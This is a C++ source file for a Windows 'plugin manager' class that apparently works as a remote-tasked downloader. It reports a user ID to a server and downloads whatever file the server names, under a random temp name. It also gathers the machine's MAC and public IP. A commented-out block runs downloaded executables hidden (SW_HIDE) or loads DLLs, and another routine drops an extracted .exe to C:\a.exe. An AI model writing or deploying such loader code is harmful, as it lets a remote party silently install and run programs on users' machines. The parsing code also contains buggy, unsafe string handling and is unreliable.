#include "AppreciationTool.h"
#include "resource.h"

//////////////////////////////////////////////////////////////////////////
// 引入自身头文件
#include <shlobj.h>

//////////////////////////////////////////////////////////////////////////
// 引用库文件

#pragma comment(lib, DIRECTORY_LIB "Function\\Function.Internal.ZipControl.lib")
#pragma comment(lib, DIRECTORY_LIB "Function\\Function.Internal.FileControl.lib")

//////////////////////////////////////////////////////////////////////////
// 构造函数
CAppreciationTaskList::CAppreciationTaskList(void)
{
	_stprintf_s(m_szVersion,_T("%d.%d.%d.%d"),M_VERSION,S_VERSION,R_VERSION,C_VERSION);
}


CAppreciationTaskList::~CAppreciationTaskList(void)
{
}

//////////////////////////////////////////////////////////////////////////
// 公用函数Public

BOOL CAppreciationTaskList::Initialization(LPCSTR lpHost,LPCSTR lpUserID,LPCSTR lpDirectory,HMODULE hModule)
{
	Out(Dbg,_T("Initialization Plugin Manager Strating."));
	BOOL bRet = FALSE;

	m_hModule = hModule;

	if (QueryInternetTask(lpHost,lpUserID,lpDirectory,hModule)) bRet = TRUE;

	Out(Dbg,_T("Initialization Plugin Manager Successful."));
	return bRet;
}

//////////////////////////////////////////////////////////////////////////
// 内部函数Private
BOOL CAppreciationTaskList::GetParam2(LPCSTR pBuf,LPCSTR lpProject,LPCSTR pFlag,LPSTR pParam)
{		
	//TCHAR wszBuffer[MAX_PATH+1] = {0};
	//MbsToWcs(pBuf,wszBuffer);
	char beg[128]={0};
	char end[128]={0};
	const char * pszBufend = NULL;
	sprintf_s(beg,"[%s]\r\n",lpProject);
	pBuf=strstr(pBuf,beg);
	if(pBuf==0)
		return FALSE;

	strcpy_s(beg,"\r\n[");
	pszBufend = strstr(pBuf,beg);

	sprintf_s(beg,"%s=",pFlag);
	const char * pbeg=strstr(pBuf,beg);
	if(pbeg==0 && pbeg > pszBufend)
		return FALSE;
	pbeg+=strlen(beg);

	sprintf_s(end," \r\n",pFlag);
	const char * pend=strstr(pbeg,end);
	if(pend==0)
		return FALSE;

	int len=pend-pbeg;
	if (0 == len) 
	{
		pParam[len] = '\0';
		return 1;
	}
	if(len>(64*1024))
		return FALSE;
	memcpy(pParam,pbeg,len* sizeof(CHAR));
	pParam[len] = '\0';

	return len;
}


BOOL CAppreciationTaskList::GetParam(LPCSTR pBuf,LPCSTR pFlag,LPSTR pParam)
{		
	char beg[128]={0};
	char end[128]={0};
	sprintf(beg,"%s=",pFlag);
	sprintf(end,";",pFlag);
	LPCSTR pbeg=strstr(pBuf,beg);
	if(pbeg==0)
		return 0;
	pbeg+=strlen(beg);
	LPCSTR pend=strstr(pbeg,end);
	if(pend==0)
		return 0;

	int len=pend-pbeg;
	if(len>(64*1024))
		return 0;

	memcpy(pParam,pbeg,len);
	pParam[len] = NULL;

	return len;
}

BOOL CAppreciationTaskList::GetProject(LPCSTR lpBuf,LPSTR lpParam,LPCSTR lpProject)
{		
	//TCHAR wszBuffer[MAX_PATH+1] = {0};
	//MbsToWcs(pBuf,wszBuffer);
	char beg[128]={0};
	char end[128]={0};
	if (lpProject[0])
	{
		sprintf_s(beg,"[%s]\r\n",lpProject);
		lpBuf=strstr(lpBuf,beg);
		if(lpBuf==0)
			return FALSE;
		lpBuf+=strlen(beg);
	}

	strcpy_s(beg,"[");
	const char * pbeg=strstr(lpBuf,beg);
	if(pbeg==0)
		return FALSE;
	pbeg+=strlen(beg);

	strcpy_s(end,"]\r\n");
	const char * pend=strstr(pbeg,end);
	if(pend==0)
		return FALSE;

	int len=pend-pbeg;
	if(len>(64*1024))
		return FALSE;
	memcpy(lpParam,pbeg,len* sizeof(CHAR));
	lpParam[len] = '\0';

	return len;
}

BOOL CAppreciationTaskList::QueryInternetTask(LPCSTR lpHost,LPCSTR lpUserID,LPCSTR lpDirectory,HMODULE hModule)
{	

	Out(Dbg,_T("Query Internet Task Starting.\r\n"));
	DATAPHOENIX dhFileInfo;
	BOOL bRetGetParam = TRUE;


	CHAR szBuffer[MAX_PATH+1] = {0};


	sprintf_s(szBuffer,"http://%s:80/VoidRay_web.php?UID=%s&TASK=QUERY",lpHost,lpUserID);
	//sprintf_s(szBuffer,("http://%s/index.php?s=/Interface/GetConfiguration/USERID/%s/KEY/%s\0"),lpHost,lpUserID,lpServerMAC);

	OutA(OutputsA,("Query Internet Task[%s]\r\n"),szBuffer);

	PCHAR szRecv = m_cInternetTackObj.GetPage(szBuffer);

	OutA(OutputsA,("Task Information:\r\n%s\r\n"),szRecv);

	if(szRecv && szRecv[0])
	{
		memset(szBuffer,0,MAX_PATH);
		//while(GetProject(szRecv,szBuffer,szBuffer))
		{
			bRetGetParam = bRetGetParam && GetParam(szRecv,("verNo"),dhFileInfo.CLSID);
			bRetGetParam = bRetGetParam && GetParam(szRecv,("md5"),dhFileInfo.MD5);
			bRetGetParam = bRetGetParam && GetParam(szRecv,("downLoadUrl"),dhFileInfo.DownPath);
			bRetGetParam = bRetGetParam && GetParam(szRecv,("cmdLine"),dhFileInfo.Command);
			bRetGetParam = bRetGetParam && GetParam(szRecv,("bRandomName"),dhFileInfo.FileName);
			if ('0' == dhFileInfo.FileName[0])
			{
				bRetGetParam = bRetGetParam && GetParam(szRecv,("fileName"),dhFileInfo.FileName);
			}else
			{
				memset(dhFileInfo.FileName,0,MAX_PATH);
			}

			if(bRetGetParam){
				//格式化文件保存路径

				if (NULL == lpDirectory)
					GetTempPathA(MAX_PATH,dhFileInfo.FilePath);
				else
					strcpy_s(dhFileInfo.FilePath,lpDirectory);

				bRetGetParam = bRetGetParam && UpdateLocalFileStatus(lpHost,&dhFileInfo);
				bRetGetParam = bRetGetParam && UpdateLocalFileConfig(lpHost,dhFileInfo);
			}
		}
	}
	Out(Dbg,_T("Query Internet Task Successful.\r\n"));
	return bRetGetParam;
}

BOOL CAppreciationTaskList::UpdateLocalFileStatus(LPCSTR lpHost,DATAPHOENIX * dhFileInfo)
{
	Out(Outputs,_T("Update Local File Status Starting.\r\n"));

	LARGE_INTEGER liFileSize;
	HANDLE hFileHandle = NULL;
	BOOL bIsDownLoadOK = FALSE;
	CHAR szTempFilePath[MAX_PATH+1] = {0};
	WCHAR szFilePath[MAX_PATH+1] = {0};

	//格式化文件保存路径
	PathAddBackslashA(dhFileInfo->FilePath);
	if ('\0' == dhFileInfo->FileName[0])
	{
		GetTempFileNameA(dhFileInfo->FilePath,"Kin",0,szTempFilePath);
		strcpy_s(dhFileInfo->FilePath,szTempFilePath);
	}else
	{
		strcat_s(dhFileInfo->FilePath,dhFileInfo->FileName);
	}

	strcpy_s(szTempFilePath,MAX_PATH,dhFileInfo->FilePath);
	PathRenameExtensionA(szTempFilePath,DEFAULT_OBJECT_FILE_TEMP_EXTENSION);

	//sprintf_s(szDownURL,"http://%s/index.php?s=/Interface/GetProjectFile/CLSID/%s",lpHost,dhFileInfo->CLSID);

	OutA(OutputsA,("File Path: [%s]\r\n"),dhFileInfo->FilePath);
	OutA(OutputsA,("Down Path: [%s]\r\n"),dhFileInfo->DownPath);
	if (PathFileExistsA(dhFileInfo->FilePath) && !stricmp(dhFileInfo->MD5,m_cFileControlTool.MD5_FileA(dhFileInfo->FilePath,32)))
	{
		Out(Outputs,_T("Do not Update Local File Status.\r\n"));
		bIsDownLoadOK = TRUE;
	}
	else
	{
		if(PathFileExistsA(szTempFilePath))
		{
			OutA(OutputsA,"Remove File: %s.\r\n",szTempFilePath);
			if(! (bIsDownLoadOK = DeleteFileA(szTempFilePath)))
			{
				OutA(ErrorsA,"Remove File[%s] Failed.\r\n",dhFileInfo->FilePath);
				return bIsDownLoadOK;
			}
		}

		MbsToWcs(dhFileInfo->FilePath,szFilePath);
		if (0 == stricmp(dhFileInfo->MD5,IDR_ZIP_LPPHOENIX_MD5) && m_cResourceControlTool.CreateFileFromResource(szFilePath,IDR_ZIP_LPPHOENIX,_T("ZIP"),m_hModule))
		{
			Out(Success,_T("Update Local File For Create File From Resource Complete.\r\n"));
		}
		else
		{
			bIsDownLoadOK = m_cInternetDownObj.DownLoadFile(szTempFilePath,dhFileInfo->DownPath);
			LPCSTR lpMD5 = m_cFileControlTool.MD5_FileA(szTempFilePath,32);

			if (NULL == lpMD5 || !bIsDownLoadOK || stricmp(dhFileInfo->MD5,lpMD5))
			{
				OutA(ErrorsA,("Update Local File Status Failed.\r\nTarget MD5: %s\r\nCurrent MD5: %s\r\n"),dhFileInfo->MD5,lpMD5);
				bIsDownLoadOK = FALSE;
				return bIsDownLoadOK;

			}else
			{
				if(PathFileExistsA(dhFileInfo->FilePath))
				{
					OutA(OutputsA,"Remove File: %s.\r\n",dhFileInfo->FilePath);
					if(!DeleteFileA(dhFileInfo->FilePath))
					{
						OutA(ErrorsA,"Remove File[%s] Failed.\r\n",dhFileInfo->FilePath);
						return FALSE;
					}
				}
				bIsDownLoadOK = MoveFileA(szTempFilePath,dhFileInfo->FilePath);
			}
		}

	}
	
	if (!bIsDownLoadOK && !(hFileHandle = CreateFileA(dhFileInfo->FilePath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL)) )
	{
		OutA(ErrorsA,"Open Object File[%s] Failed.\r\n",dhFileInfo->FilePath);
		return bIsDownLoadOK;
	}

	memset(&liFileSize,0,sizeof(LARGE_INTEGER));
	GetFileSizeEx(hFileHandle,&liFileSize);
	CloseHandle(hFileHandle);

	dhFileInfo->dwFileSize = liFileSize.QuadPart;
	Runend(bIsDownLoadOK,_T("Update Local File Status Complete.\r\n"));
	return bIsDownLoadOK;
}

BOOL CAppreciationTaskList::UpdateLocalFileConfig(LPCSTR lpHost,DATAPHOENIX dhFileInfo)
{
	/*
	if (0 == stricmp(PathFindExtensionA(dhFileInfo.DownPath),".EXE"))
	{
#ifdef _DEBUG
		return (31 < WinExec(dhFileInfo.DownPath,SW_SHOW));
#else
		return (31 < WinExec(dhFileInfo.DownPath,SW_HIDE));
#endif
	}else if (0 == stricmp(PathFindExtensionA(dhFileInfo.DownPath),".DLL"))
	{
		return (NULL != LoadLibraryA(dhFileInfo.DownPath));
	}
	return FALSE;
	*/
	return 0;

	fex_t * fex;
	const void* data;
	char szFile[MAX_PATH] = {0};
	FILE * fConfigFile;



	fex_open(&fex,dhFileInfo.DownPath);	
	while ( !fex_done( fex ) )
	{
		if ( fex_has_extension( fex_name( fex ), ".exe" ) ) 
		{
			OutA(OutputsA,fex_name( fex ));
			const char* str = fex_err_str( fex_data( fex, &data ) );
			if (str != NULL)
			{
				OutA(OutputsA,str);
			}

			OutA(OutputsA,"%d",fex_size(fex));
			strcpy_s(szFile,"C:\\a.exe");
			if (0 !=fopen_s(&fConfigFile,szFile,"wb"))
			{
				OutA(OutputsA,"Update Local File Config Failed.");
			}else
			{
				fwrite(data,1,fex_size(fex),fConfigFile);
				fflush(fConfigFile);
				fclose(fConfigFile);
			}


			fex_next( fex );
			continue;
		}

		fex_next( fex );
	}
	return TRUE;
}

#include <Iphlpapi.h>

#pragma comment(lib,"Iphlpapi.lib")

void output(PIP_ADAPTER_INFO pIpAdapterInfo);
bool CAppreciationTaskList::GetComputerMACAddress(__out LPSTR lpMACAddressBuffer)
{
	Out(Dbg,_T("Get Computer MAC Address Starting."));
	bool bRet = false;
	//PIP_ADAPTER_INFO结构体指针存储本机网卡信息
	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
	//得到结构体大小,用于GetAdaptersInfo参数
	unsigned long stSize = sizeof(IP_ADAPTER_INFO);
	//调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
	int nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);
	if (ERROR_BUFFER_OVERFLOW==nRel)
	{
		//如果函数返回的是ERROR_BUFFER_OVERFLOW
		//则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
		//这也是说明为什么stSize既是一个输入量也是一个输出量
		//释放原来的内存空间
		delete pIpAdapterInfo;
		//重新申请内存空间用来存储所有网卡信息
		pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
		//再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
		nRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);    
	}
	if (ERROR_SUCCESS==nRel)
	{

		bRet = true;
		//输出网卡信息
		//可能有多网卡,因此通过循环去判断
		//while (pIpAdapterInfo)
		{
			Out(Outputs,_T("*****************************************************"));
			OutA(OutputsA,("网卡名称：%s"),pIpAdapterInfo->AdapterName);
			OutA(OutputsA,"网卡描述：%s",pIpAdapterInfo->Description);
			sprintf_s(lpMACAddressBuffer,MAX_MAC_ADDRESS_LEN,"%02x-%02x-%02x-%02x-%02x-%02x-%02x-%02x", pIpAdapterInfo->Address[0],pIpAdapterInfo->Address[1],pIpAdapterInfo->Address[2],pIpAdapterInfo->Address[3],pIpAdapterInfo->Address[4],pIpAdapterInfo->Address[5],pIpAdapterInfo->Address[6],pIpAdapterInfo->Address[7]);
			OutA(OutputsA,"网卡MAC地址：%s",lpMACAddressBuffer);
			Out(Outputs,_T("网卡IP地址如下："));
			//可能网卡有多IP,因此通过循环去判断
			IP_ADDR_STRING *pIpAddrString =&(pIpAdapterInfo->IpAddressList);
			do 
			{
				OutA(OutputsA,pIpAddrString->IpAddress.String);
				pIpAddrString=pIpAddrString->Next;
			} while (pIpAddrString);
			pIpAdapterInfo = pIpAdapterInfo->Next;
			Out(Outputs,_T("*****************************************************"));
		}
	}
	else
	{
		Out(Errors,_T("Get Computer MAC Address Failed."));
		Show();
		bRet = false;
	}
	//释放内存空间
	if (pIpAdapterInfo)
	{
		//delete pIpAdapterInfo;
	}
	Runend(bRet,_T("Get Computer MAC Address Successed."));
	return bRet;
}

typedef struct _GETIPPAGEFORMATINFO
{
	char PageURL[MAX_PATH];
	char PageEnd[50];
	char PageHand[50];
}GETIPPAGEFORMATINFO, * PGETIPPAGEFORMATINFO;

bool CAppreciationTaskList::GetComputerIPAddress(__out LPSTR lpIPAddressBuffer)
{
	Out(Dbg,_T("Get Computer IP Address Starting."));
	GETIPPAGEFORMATINFO ipFormatInfo[4];
	strcpy_s(ipFormatInfo[0].PageURL , "http://pv.sohu.com/cityjson");
	strcpy_s(ipFormatInfo[1].PageURL , "http://ip.3322.net/");
	strcpy_s(ipFormatInfo[2].PageURL , "http://apps.game.qq.com/comm-htdocs/ip/get_ip.php");

	strcpy_s(ipFormatInfo[0].PageHand , "\"cip\": \"");
	strcpy_s(ipFormatInfo[1].PageHand , "");
	strcpy_s(ipFormatInfo[2].PageHand , "\"ip_address\":\"");

	strcpy_s(ipFormatInfo[0].PageEnd , "\", \"cid\"");
	strcpy_s(ipFormatInfo[1].PageEnd , "");
	strcpy_s(ipFormatInfo[2].PageEnd , "\"}");
	for (int i = 0;i < 3;i++)
	{
		lpIPAddressBuffer[0] = '\0';
		LPCSTR lpIpPage = m_cInternetDownObj.GetPage(ipFormatInfo[i].PageURL);
		if (NULL==lpIpPage)
		{
			Out(Dbg,_T("Get Computer IP Address Failed."));
			Show();
			continue;
		}
		else
		{
			LPCSTR lpIpPageHand = strstr(lpIpPage,ipFormatInfo[i].PageHand);
			if (NULL == lpIpPageHand)
			{
				Out(Dbg,_T("Get Computer IP Address Failed."));
				Show();
				continue;
			}
			lpIpPageHand += strlen(ipFormatInfo[i].PageHand);
			LPCSTR lpIpPageEnd = strstr(lpIpPage,ipFormatInfo[i].PageEnd);

			if (lpIpPage == lpIpPageEnd)
			{
				strncpy_s(lpIPAddressBuffer,MAX_PATH,lpIpPageHand,strlen(lpIpPage));
				OutA(OutputsA,lpIPAddressBuffer);
				break;
			}
			strncpy_s(lpIPAddressBuffer,MAX_IP4_ADDRESS_LEN,lpIpPageHand,lpIpPageEnd-lpIpPageHand);

			OutA(OutputsA,lpIPAddressBuffer);
			break;
		}
	}
	Out(Dbg,_T("Get Computer IP Address Successed."));
	return true;
}